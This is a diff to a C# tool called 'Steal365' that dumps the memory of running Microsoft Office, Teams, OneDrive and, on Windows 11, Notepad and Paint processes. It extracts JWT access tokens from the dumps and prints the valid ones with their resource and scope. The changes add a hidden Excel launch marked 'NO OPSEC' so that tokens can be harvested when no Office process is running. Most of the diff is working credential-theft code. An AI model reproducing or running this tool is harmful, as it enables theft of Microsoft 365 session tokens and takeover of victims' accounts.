@@ -6,8 +6,6 @@ using System.Runtime.InteropServices;
 using System.Text;
 using System.Text.RegularExpressions;
 
-using static Steal365.Class1;
-
 namespace Steal365
 {
     public class Program
@@ -27,7 +25,7 @@ namespace Steal365
             }
             catch
             {
-                Console.WriteLine($"    - {pName} not found!\n");
+                Console.WriteLine($"    - {pName} not found!");
                 return null;
             }
 
@@ -78,14 +76,14 @@ namespace Steal365
                     return byteArray;
 
                 }
-                Console.WriteLine("  [-] Dump failed");
+                Console.WriteLine("  - dump failed");
                 Console.WriteLine(Marshal.GetLastWin32Error());
                 return null;
             }
             catch (Exception e)
             {
-                Console.WriteLine("  [-] Exception dumping process memory");
-                Console.WriteLine($"\n  [-] {e.Message}\n{e.StackTrace}");
+                Console.WriteLine("  - exception dumping process memory");
+                Console.WriteLine($"\n  - {e.Message}\n{e.StackTrace}");
                 return null;
             }
         }
@@ -112,8 +110,12 @@ namespace Steal365
 
         static void CheckToken(List<string> tokens)
         {
+            Console.WriteLine($"  \\-- dump ok");
+            Console.WriteLine($"  \\-- looking for tokens...");
+
             foreach (var token in tokens)
             {
+                
                 var payload = token.Split('.')[1];
 
                 while ((payload.Length % 4) != 0)
@@ -123,7 +125,15 @@ namespace Steal365
 
                 var json = Encoding.UTF8.GetString(Convert.FromBase64String(payload));
 
-                var match = Regex.Match(json, @"""exp"":\s*(\d+)");
+                var match = Regex.Match(json, @"""exp"":\s*""?(\d+)""?");
+
+                if (!match.Success)
+                {
+                    Console.WriteLine("    + Token without exp");
+                    Console.WriteLine($"    + Token: {token}\n");
+                    continue;
+                }
+
                 long exp = long.Parse(match.Groups[1].Value);
 
                 if (exp > DateTimeOffset.Now.ToUnixTimeSeconds())
@@ -134,28 +144,103 @@ namespace Steal365
                     Console.WriteLine($"    + Valid token: {dateTime}");
 
                     match = Regex.Match(json, @"""aud"":\s*""([^""]+)""");
-                    Console.WriteLine($"    + aud: {match.Groups[1].Value}");
+                    Console.WriteLine($"    + Resource: {match.Groups[1].Value}");
+
+                    match = Regex.Match(json, @"""scp"":\s*""([^""]+)""");
+                    Console.WriteLine($"    + Scope: {match.Groups[1].Value}");
 
                     Console.WriteLine($"    + Token: {token}\n");
                 }
             }
         }
 
+        static bool CheckWin11()
+        {
+            RTL_OSVERSIONINFOEX versionInfo = new RTL_OSVERSIONINFOEX();
+            versionInfo.dwOSVersionInfoSize = Marshal.SizeOf(typeof(RTL_OSVERSIONINFOEX));
+
+            int status = RtlGetVersion(ref versionInfo);
+            if (status == 0) // STATUS_SUCCESS
+            {
+                // Windows 11: Major = 10, Build >= 22000
+                return versionInfo.dwMajorVersion == 10 && versionInfo.dwBuildNumber >= 22000;
+            }
+
+            return false;
+        }
+
+        static void NewProcess()
+        {
+            try
+            {
+                string fullName = @"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE";
+                string pName = "excel";
+                ProcessStartInfo psi = new ProcessStartInfo
+                {
+                    FileName = fullName,
+                    UseShellExecute = false,
+                    CreateNoWindow = true,
+                    WindowStyle = ProcessWindowStyle.Hidden
+                };
+
+                using (Process p = Process.Start(psi))
+                {
+                    Console.WriteLine("[+] process created");
+
+                    Console.WriteLine($"[>] try dump: {pName}");
+                    byte[] dump = SafetyDump(pName);
+
+                    if (dump != null)
+                    {
+                        var tokens = GetTokens(dump);
+
+                        if (tokens.Any())
+                        {
+                            CheckToken(tokens);
+                        }
+                        else
+                        {
+                            Console.WriteLine($"    - no tokens\n");
+                        }
+                    }
+
+                    if (!p.HasExited)
+                    {
+                        p.Kill();
+                        Console.WriteLine("[+] process killed");
+                    }
+                }
+
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[-] Error: " + ex.Message);
+            }
+        }
+
         public static void Main(string[] args) 
         {
-            Console.WriteLine("\n      --++[   Steal365   ]++--\n");
+            Console.WriteLine("\n      --++[   Steal365   ]++--");
 
-            var procs = new List<string> { "WINWORD", "onenoteim", "ONENOTEM", "ms-teams", "POWERPNT", "OUTLOOK", "EXCEL", "OneDrive" };
+            var procs = new List<string> { "WINWORD", "onenoteim", "ONENOTE", "ms-teams", "POWERPNT", "OUTLOOK", "EXCEL", "OneDrive" };
 
-            foreach (string p in procs) 
+            if (CheckWin11())
             {
-                Console.WriteLine($"[>] try dump: {p}");
+                //Console.WriteLine("win11");
+                procs.Add("Notepad");
+                procs.Add("mspaint");
+            }
+
+            bool check = true;
+            foreach (string p in procs)
+            {
+                Console.WriteLine($"\n[>] try dump: {p}");
                 byte[] dump = SafetyDump(p);
+                
                 
                 if (dump != null) 
                 {
-                    Console.WriteLine($"  \\-- dump {p} ok");
-                    Console.WriteLine($"  \\-- looking for tokens...");
+                    check = false;
 
                     var tokens = GetTokens(dump);
 
@@ -169,6 +254,110 @@ namespace Steal365
                     }
                 }
             }
+
+            if (check)
+            {
+                Console.WriteLine("\n[+] no office process found");
+                Console.WriteLine("[!] [NO OPSEC] do you want to create a process? (y/n)");
+                string res = Console.ReadLine()?.ToLower();
+
+                if (res == "y")
+                {
+                    NewProcess();
+                }
+                else
+                {
+                    Console.WriteLine("[-] done");
+                }
+                
+            }
+        }
+
+        [DllImport("ntdll.dll", SetLastError = true)]
+        private static extern int RtlGetVersion(ref RTL_OSVERSIONINFOEX lpVersionInformation);
+
+        [StructLayout(LayoutKind.Sequential)]
+        private struct RTL_OSVERSIONINFOEX
+        {
+            public int dwOSVersionInfoSize;
+            public int dwMajorVersion;
+            public int dwMinorVersion;
+            public int dwBuildNumber;
+            public int dwPlatformId;
+            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
+            public string szCSDVersion;
+        }
+
+        [DllImport("dbghelp.dll", EntryPoint = "MiniDumpWriteDump", CallingConvention = CallingConvention.StdCall,
+             CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
+        internal static extern bool MiniDumpWriteDump(IntPtr hProcess, uint processId, IntPtr hFile, uint dumpType,
+             IntPtr expParam, IntPtr userStreamParam, IntPtr callbackParam);
+
+        [StructLayout(LayoutKind.Sequential, Pack = 1)]
+        internal struct MINIDUMP_IO_CALLBACK
+        {
+            internal IntPtr Handle;
+            internal ulong Offset;
+            internal IntPtr Buffer;
+            internal int BufferBytes;
+        }
+
+        [StructLayout(LayoutKind.Sequential, Pack = 1)]
+        internal struct MINIDUMP_CALLBACK_INFORMATION
+        {
+            internal MinidumpCallbackRoutine CallbackRoutine;
+            internal IntPtr CallbackParam;
+        }
+
+        [StructLayout(LayoutKind.Sequential, Pack = 1)]
+        internal struct MINIDUMP_CALLBACK_INPUT
+        {
+            internal int ProcessId;
+            internal IntPtr ProcessHandle;
+            internal MINIDUMP_CALLBACK_TYPE CallbackType;
+            internal MINIDUMP_IO_CALLBACK Io;
+        }
+
+        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+        internal delegate bool MinidumpCallbackRoutine(IntPtr CallbackParam, IntPtr CallbackInput,
+            IntPtr CallbackOutput);
+
+        internal enum HRESULT : uint
+        {
+            S_FALSE = 0x0001,
+            S_OK = 0x0000,
+            E_INVALIDARG = 0x80070057,
+            E_OUTOFMEMORY = 0x8007000E
+        }
+
+        internal struct MINIDUMP_CALLBACK_OUTPUT
+        {
+            internal HRESULT status;
+        }
+
+        internal enum MINIDUMP_CALLBACK_TYPE
+        {
+            ModuleCallback,
+            ThreadCallback,
+            ThreadExCallback,
+            IncludeThreadCallback,
+            IncludeModuleCallback,
+            MemoryCallback,
+            CancelCallback,
+            WriteKernelMinidumpCallback,
+            KernelMinidumpStatusCallback,
+            RemoveMemoryCallback,
+            IncludeVmRegionCallback,
+            IoStartCallback,
+            IoWriteAllCallback,
+            IoFinishCallback,
+            ReadMemoryFailureCallback,
+            SecondaryFlagsCallback,
+            IsProcessSnapshotCallback,
+            VmStartCallback,
+            VmQueryCallback,
+            VmPreReadCallback,
+            VmPostReadCallback
         }
     }
 }
